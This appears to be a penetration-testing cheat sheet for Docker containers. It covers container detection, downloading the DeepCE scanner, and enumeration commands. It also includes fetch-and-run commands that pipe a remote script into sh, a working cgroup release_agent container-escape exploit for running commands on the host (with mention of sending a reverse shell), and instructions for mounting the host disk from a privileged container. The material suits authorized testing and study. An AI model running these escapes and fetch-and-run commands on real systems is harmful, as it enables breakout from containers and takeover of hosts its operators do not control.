# Docker Container

## Am I in a container?

* Hostname is something like `dcdd01356172` or a similar hex string
* root folder contains `.dockerenv` file&#x20;
* executing `cat /proc/1/cgroup` returns docker strings
* There are few processes running and none of them are kernel spawned
* Some default \*nix commands such as wget, ps, ifconfig, ip are missing

## DeepCE

Automated tool for vulnerability scanning inside a Docker container.

See [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

### Download

```
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh

#python requests
python -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content)' > deepce.sh 
python3 -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content.decode("utf-8"))' > deepce.sh

#load in memory
wget -O - https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
```

## Manual Enumeration

### OS info

```
cat /etc/issue
cat /etc/*-release
uname -a
```

### Running processes

```
readlink -f /proc/*/exe    #link to executable file
cat /proc/*/comm           #console friendly process name (not always available)
```

### Partitions

```
cat /etc/fstab
fdisk -l
```

### Network

```
cat /proc/net/tcp
cat /proc/net/*
```

All IP addresses are printed as little-endian hexadecimal strings. For example:

IP address: `020011AC --> AC.11.00.02 --> 172.16.00.02`

Gateway mask: `0000FFFF --> FF.FF.00.00 --> 255.255.00.00`

## Container escape

By executing this exploit it's possible to execute commands on the host machine, allowing us to enumerate the host or send a reverse shell from the actual host to our machine.

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "<command> > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Mount /dev/sda1

If the container is privileged, it is possible to mount the physical machine's partition from within the container, thus allowing us to manipulate files in the actual host.

```
fdisk -l     check if external drives are visible

mkdir /tmp/sda
mount /dev/sda1 /tmp/sda
```
